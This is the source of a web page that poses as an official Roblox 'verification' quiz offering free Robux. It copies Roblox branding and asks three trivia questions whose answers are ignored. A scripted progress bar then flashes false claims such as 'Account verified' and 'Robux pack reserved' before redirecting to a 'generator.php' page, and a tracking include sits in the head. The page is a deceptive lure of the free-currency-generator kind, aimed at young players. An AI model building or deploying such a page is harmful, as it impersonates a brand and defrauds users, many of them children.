<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Quiz 2026 — Verify & Claim Your Free Robux</title>
    <meta name="description" content="Answer 3 quick Roblox questions to verify your account and unlock your free Robux reward instantly.">
    <meta name="keywords" content="roblox quiz, free robux quiz, roblox verification, claim robux">
    <meta name="robots" content="noindex, nofollow">
    <meta property="og:type"        content="website">
    <meta property="og:title"       content="Roblox Quiz 2026 — Verify & Claim Your Free Robux">
    <meta property="og:description" content="Answer 3 quick Roblox questions to verify your account and unlock your free Robux.">
    <meta property="og:image" content="https://rbxliy.com/images/maxresdefault.jpg">
    <meta property="og:image:secure_url" content="https://rbxliy.com/images/maxresdefault.jpg">
    <meta property="og:image:type" content="image/jpeg">
    <meta property="og:image:width" content="686">
    <meta property="og:image:height" content="386">
    <meta name="twitter:card"       content="summary_large_image">
    <meta name="twitter:title"      content="Roblox Quiz 2026 — Verify & Claim Your Free Robux">
    <meta name="twitter:image"      content="https://rbxliy.com/images/maxresdefault.jpg">
    <link rel="icon" type="image/png" href="images/icon_resource_gem.png">
    <link href="https://fonts.googleapis.com/css2?family=Lilita+One&family=Inter:wght@400;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        *,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
        html,body{height:100%;}

        body {
            font-family: 'Inter', sans-serif;
            background: #0a0e1a;
            color: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            overflow-x: hidden;
        }

        /* BG */
        body::before {
            content: '';
            position: fixed; inset: 0; z-index: 0;
            background:
                radial-gradient(ellipse 100% 60% at 50% 0%, rgba(255,68,0,0.15) 0%, transparent 65%),
                radial-gradient(ellipse 80% 50% at 80% 100%, rgba(0,120,255,0.1) 0%, transparent 60%),
                #0a0e1a;
        }

        .wrap {
            position: relative; z-index: 1;
            width: 100%; max-width: 520px;
            padding: 32px 20px 48px;
            display: flex; flex-direction: column; align-items: center;
        }

        /* LOGO */
        .logo-area {
            display: flex; flex-direction: column; align-items: center;
            margin-bottom: 18px;
        }
        .logo-img {
            width: 64px; height: 64px; object-fit: contain;
            margin-bottom: 8px;
        }
        .logo-text {
            font-family: 'Lilita One', cursive;
            font-size: 26px; letter-spacing: 1px;
            color: #fff;
        }
        .logo-text span { color: #ff4400; }

        /* FEATURE IMAGE */
        .feat-img {
            width: 100%; border-radius: 16px;
            border: 2px solid rgba(255,255,255,0.08);
            box-shadow: 0 16px 48px rgba(0,0,0,0.55);
            margin-bottom: 24px;
            max-height: 200px; object-fit: cover;
        }

        /* STEP DOTS */
        .steps {
            display: flex; gap: 10px; margin-bottom: 24px;
        }
        .step-dot {
            width: 10px; height: 10px; border-radius: 50%;
            background: rgba(255,255,255,0.2);
            transition: background 0.35s, transform 0.35s;
        }
        .step-dot.active { background: #ff4400; transform: scale(1.35); }
        .step-dot.done   { background: #22c55e; }

        /* QUIZ CARD */
        .quiz-card {
            width: 100%;
            background: rgba(255,255,255,0.04);
            border: 1px solid rgba(255,255,255,0.09);
            border-radius: 20px;
            padding: 28px 24px;
            box-shadow: 0 8px 40px rgba(0,0,0,0.4);
        }

        .q-label {
            font-size: 12px; font-weight: 700; letter-spacing: 1.5px;
            color: #ff6633; text-transform: uppercase; margin-bottom: 10px;
        }

        .q-text {
            font-size: clamp(17px, 4vw, 22px);
            font-weight: 800; line-height: 1.35;
            margin-bottom: 24px; color: #fff;
        }

        /* OPTIONS */
        .options { display: flex; flex-direction: column; gap: 12px; }

        .opt {
            display: flex; align-items: center; gap: 14px;
            background: rgba(255,255,255,0.05);
            border: 2px solid rgba(255,255,255,0.1);
            border-radius: 14px; padding: 14px 18px;
            cursor: pointer; transition: all 0.2s;
            font-size: 15px; font-weight: 600; color: #fff;
            user-select: none;
        }
        .opt:hover { background: rgba(255,68,0,0.12); border-color: rgba(255,68,0,0.4); transform: translateX(4px); }
        .opt.disabled { pointer-events: none; opacity: 0.5; }
        .opt.selected { opacity: 1 !important; }

        .opt-letter {
            width: 30px; height: 30px; border-radius: 8px; flex-shrink: 0;
            background: rgba(255,255,255,0.1);
            display: flex; align-items: center; justify-content: center;
            font-size: 13px; font-weight: 800;
        }

        /* LOADING SCREEN */
        #loading-screen {
            display: none;
            flex-direction: column; align-items: center; justify-content: center;
            position: fixed; inset: 0; z-index: 100;
            background: #0a0e1a;
            gap: 20px;
        }
        #loading-screen.show { display: flex; }

        .load-logo { font-family:'Lilita One',cursive; font-size:28px; color:#fff; }
        .load-logo span { color:#ff4400; }

        .load-msg {
            font-size: 16px; font-weight: 700; color: rgba(255,255,255,0.8);
            min-height: 24px; text-align: center;
        }

        .load-bar-track {
            width: 280px; max-width: 90vw;
            height: 12px; background: rgba(255,255,255,0.1);
            border-radius: 99px; overflow: hidden;
        }
        .load-bar-fill {
            height: 100%; width: 0%;
            background: linear-gradient(90deg, #ff4400, #ff8800);
            border-radius: 99px;
            transition: width 0.25s ease;
            box-shadow: 0 0 12px rgba(255,68,0,0.6);
        }
        .load-pct {
            font-size: 28px; font-weight: 900;
            color: #ff6633;
        }

        .load-checkmarks {
            display: flex; flex-direction: column; gap: 8px;
            min-height: 80px;
        }
        .load-check {
            display: flex; align-items: center; gap: 10px;
            font-size: 14px; color: rgba(255,255,255,0.65);
            opacity: 0; transform: translateY(8px);
            transition: all 0.35s ease;
        }
        .load-check.show { opacity: 1; transform: translateY(0); }
        .load-check-icon { color: #22c55e; font-size: 16px; }
    </style>
<?php require_once 'head_tracking.php'; ?>
</head>
<body>

<!-- LOADING SCREEN -->
<div id="loading-screen">
    <div class="load-logo">ROBL<span>OX</span></div>
    <div class="load-pct" id="load-pct">0%</div>
    <div class="load-bar-track">
        <div class="load-bar-fill" id="load-bar"></div>
    </div>
    <div class="load-msg" id="load-msg">Verifying your account...</div>
    <div class="load-checkmarks" id="load-checks"></div>
</div>

<!-- QUIZ -->
<div class="wrap" id="quiz-wrap">

    <!-- Logo -->
    <div class="logo-area">
        <img src="images/icon_resource_gem.png" alt="Robux" class="logo-img" onerror="this.style.display='none'">
        <div class="logo-text">ROBL<span>OX</span></div>
    </div>

    <!-- Feature image -->
    <img src="images/maxresdefault.jpg" alt="Roblox" class="feat-img" onerror="this.style.display='none'">

    <!-- Step dots -->
    <div class="steps" id="steps">
        <div class="step-dot active" id="dot-0"></div>
        <div class="step-dot"        id="dot-1"></div>
        <div class="step-dot"        id="dot-2"></div>
    </div>

    <!-- Quiz card -->
    <div class="quiz-card" id="quiz-card">
        <div class="q-label" id="q-label">Question 1 of 3</div>
        <div class="q-text"  id="q-text"></div>
        <div class="options" id="options"></div>
    </div>

</div>

<script>
var QUESTIONS = [
    {
        q: "What currency is used to buy items in Roblox?",
        opts: ["Gems", "Robux", "Coins", "Stars"],
        correct: 1
    },
    {
        q: "What year was Roblox officially launched to the public?",
        opts: ["2004", "2006", "2008", "2010"],
        correct: 1
    },
    {
        q: "Which of these is a popular Roblox game genre?",
        opts: ["Battle Royale", "Obby (Obstacle Course)", "Both of these", "None of these"],
        correct: 2
    }
];

var LOAD_MESSAGES = [
    "Verifying your answers...",
    "Checking account eligibility...",
    "Connecting to Roblox servers...",
    "Preparing your Robux pack...",
    "Almost ready..."
];

var LOAD_CHECKS = [
    "✅ Quiz completed",
    "✅ Account verified",
    "✅ Robux pack reserved",
    "✅ Transfer ready"
];

var current = 0;
var letters = ['A','B','C','D'];

function renderQ(idx) {
    var q = QUESTIONS[idx];
    document.getElementById('q-label').textContent = 'Question ' + (idx+1) + ' of ' + QUESTIONS.length;
    document.getElementById('q-text').textContent  = q.q;

    // Update dots
    for (var i = 0; i < QUESTIONS.length; i++) {
        var dot = document.getElementById('dot-' + i);
        dot.className = 'step-dot';
        if (i < idx)  dot.classList.add('done');
        if (i === idx) dot.classList.add('active');
    }

    var optBox = document.getElementById('options');
    optBox.innerHTML = '';
    q.opts.forEach(function(text, i) {
        var div = document.createElement('div');
        div.className = 'opt';
        div.innerHTML = '<div class="opt-letter">' + letters[i] + '</div><span>' + text + '</span>';
        div.addEventListener('click', function() { onAnswer(div, i, q.correct, idx); });
        optBox.appendChild(div);
    });
}

function onAnswer(el, chosen, correct, qIdx) {
    // Lock all options
    document.querySelectorAll('.opt').forEach(function(o) { o.classList.add('disabled'); });

    // Highlight selected only
    el.style.borderColor = 'rgba(255,68,0,0.6)';
    el.style.background  = 'rgba(255,68,0,0.12)';

    // Auto advance after short delay
    setTimeout(function() {
        current++;
        if (current < QUESTIONS.length) {
            slideOut(function() {
                renderQ(current);
                slideIn();
            });
        } else {
            // All done — show loading
            startLoading();
        }
    }, 900);
}

function slideOut(cb) {
    var card = document.getElementById('quiz-card');
    card.style.transition = 'opacity 0.25s, transform 0.25s';
    card.style.opacity = '0';
    card.style.transform = 'translateX(-30px)';
    setTimeout(function() { card.style.opacity = ''; card.style.transform = ''; cb(); }, 260);
}

function slideIn() {
    var card = document.getElementById('quiz-card');
    card.style.transition = 'none';
    card.style.opacity = '0';
    card.style.transform = 'translateX(30px)';
    requestAnimationFrame(function() {
        requestAnimationFrame(function() {
            card.style.transition = 'opacity 0.3s, transform 0.3s';
            card.style.opacity = '1';
            card.style.transform = 'translateX(0)';
        });
    });
}

function startLoading() {
    document.getElementById('quiz-wrap').style.display = 'none';
    var ls = document.getElementById('loading-screen');
    ls.classList.add('show');

    var pct = 0;
    var bar = document.getElementById('load-bar');
    var pctEl = document.getElementById('load-pct');
    var msgEl = document.getElementById('load-msg');
    var checksEl = document.getElementById('load-checks');

    // Add check items (hidden)
    LOAD_CHECKS.forEach(function(txt) {
        var d = document.createElement('div');
        d.className = 'load-check';
        d.innerHTML = '<span class="load-check-icon">✅</span><span>' + txt + '</span>';
        checksEl.appendChild(d);
    });

    var checkItems = checksEl.querySelectorAll('.load-check');
    var msgIdx = 0;

    var interval = setInterval(function() {
        var speed = pct < 60 ? 1.8 : pct < 85 ? 1.1 : 0.6;
        pct = Math.min(100, pct + speed);

        bar.style.width = pct + '%';
        pctEl.textContent = Math.floor(pct) + '%';

        // Reveal messages
        var mIdx = Math.floor(pct / (100 / LOAD_MESSAGES.length));
        if (mIdx !== msgIdx && mIdx < LOAD_MESSAGES.length) {
            msgIdx = mIdx;
            msgEl.textContent = LOAD_MESSAGES[mIdx];
        }

        // Reveal checks
        var cIdx = Math.floor(pct / 26);
        for (var i = 0; i <= cIdx && i < checkItems.length; i++) {
            checkItems[i].classList.add('show');
        }

        if (pct >= 100) {
            clearInterval(interval);
            pctEl.textContent = '100%';
            msgEl.textContent = '🎉 Ready! Redirecting...';
            setTimeout(function() {
                window.location.href = 'generator.php';
            }, 800);
        }
    }, 45);
}

// Init
renderQ(0);
</script>

</body>
</html>
